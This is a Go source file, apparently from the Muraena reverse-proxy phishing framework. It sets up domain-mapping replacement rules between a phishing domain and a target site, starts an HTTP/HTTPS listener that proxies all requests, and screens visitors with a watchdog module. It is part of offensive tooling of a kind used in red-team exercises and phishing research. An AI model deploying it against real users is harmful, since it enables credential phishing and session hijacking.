package proxy

import (
	"crypto/tls"
	"crypto/x509"
	"fmt"
	"net"
	"net/http"
	"os"

	"github.com/evilsocket/islazy/tui"

	"github.com/muraenateam/muraena/core"
	"github.com/muraenateam/muraena/log"
	"github.com/muraenateam/muraena/module/watchdog"
	"github.com/muraenateam/muraena/session"
)

type tlsServer struct {
	*muraenaServer

	Cert     string
	Key      string
	CertPool string

	Config *tls.Config
}

type muraenaServer struct {
	http.Server
	NetListener net.Listener
}

func (server *tlsServer) serveTLS() (err error) {
	server.Config.Certificates[0], err = tls.X509KeyPair([]byte(server.Cert), []byte(server.Key))
	if err != nil {
		return err
	}

	if server.CertPool != "" { // needed only for custom CAs
		certpool := x509.NewCertPool()
		if !certpool.AppendCertsFromPEM([]byte(server.CertPool)) {
			log.Error("Error handling x509.NewCertPool()")
		}
		server.Config.ClientCAs = certpool
	}

	tlsListener := tls.NewListener(server.NetListener, server.Config)
	return server.Serve(tlsListener)
}

func Run(sess *session.Session) {

	// 加载替换规则
	var replacer = &Replacer{
		Phishing:                      sess.Config.Proxy.Phishing,
		Target:                        sess.Config.Proxy.Target,
		ExternalOrigin:                sess.Config.Crawler.ExternalOrigins,
		ExternalOriginPrefix:          sess.Config.Crawler.ExternalOriginPrefix,
		OriginsMapping:                sess.Config.Crawler.OriginsMapping,
		CustomResponseTransformations: sess.Config.Transform.Response.Custom,
	}
	// 定义 domain 的映射
	if err := replacer.DomainMapping(); err != nil {
		log.Fatal(err.Error())
	}
	// 准备替换表，还未进行替换
	replacer.MakeReplacements()

	// 启动反向代理
	http.HandleFunc("/", func(response http.ResponseWriter, request *http.Request) {
		// TODO: 正确配置中间件
		if sess.Config.Watchdog.Enabled {
			m, err := sess.Module("watchdog")
			if err != nil {
				log.Error("%s", err)
			}

			wd, ok := m.(*watchdog.Watchdog)
			if ok {
				// 根据 ip 与 ua 查看是否进行此次请求
				if !wd.Allow(request) {
					// 获得 response
					wd.CustomResponse(response, request)
					return
				}
			}
		}

		s := &SessionType{Session: sess, Replacer: replacer}
		s.HandleFood(response, request)
	})

	listeningAddress := fmt.Sprintf(`%s:%d`, sess.Config.Proxy.IP, sess.Config.Proxy.Port)
	netListener, err := net.Listen(sess.Config.Proxy.Listener, listeningAddress)
	if core.IsError(err) {
		log.Fatal("%s", err)
	}

	muraena := &muraenaServer{NetListener: netListener}

	lline := fmt.Sprintf("Muraena is alive on %s \n[ %s ] ==> [ %s ]", tui.Green(listeningAddress), tui.Yellow(sess.Config.Proxy.Phishing), tui.Green(sess.Config.Proxy.Target))
	log.Info(lline)

	if *sess.Options.Proxy {
		// If HTTP_PROXY or HTTPS_PROXY env variables are defined
		// all the proxy traffic will be forwarded to the defined proxy.
		// Basically a MiTM of the MiTM :)

		env := os.Getenv("HTTP_PROXY")
		if env == "" {
			env = os.Getenv("HTTPS_PROXY")
		}

		if env == "" {
			log.Error("Unable to find proxy setup from environment variables HTTP_PROXY and HTTPs_PROXY.")
		} else {
			log.Info("Muraena will be proxied to: %s", env)
		}
	}

	if sess.Config.TLS.Enabled == false {
		// HTTP only
		if err := muraena.Serve(muraena.NetListener); core.IsError(err) {
			log.Fatal("Error binding Muraena on HTTP: %s", err)
		}

	} else {
		// HTTPS
		if sess.Config.Proxy.HTTPtoHTTPS.Enabled {
			// redirect HTTP > HTTPS
			newNetListener, err := net.Listen(sess.Config.Proxy.Listener, fmt.Sprintf("%s:%d", sess.Config.Proxy.IP, sess.Config.Proxy.HTTPtoHTTPS.HTTPport))
			if core.IsError(err) {
				log.Fatal("%s", err)
			}

			server := &http.Server{Handler: RedirectToHTTPS(sess.Config.Proxy.Port)}
			go server.Serve(newNetListener)
		}

		// Attach TLS configurations to muraena server
		cTLS := sess.Config.TLS
		tlsServer := &tlsServer{
			muraenaServer: muraena,
			Cert:          cTLS.CertificateContent,
			Key:           cTLS.KeyContent,
			CertPool:      cTLS.RootContent,

			Config: sess.GetTLSClientConfig(),
		}
		if err := tlsServer.serveTLS(); core.IsError(err) {
			log.Fatal("Error binding Muraena on HTTPS: %s", err)
		}
	}
}
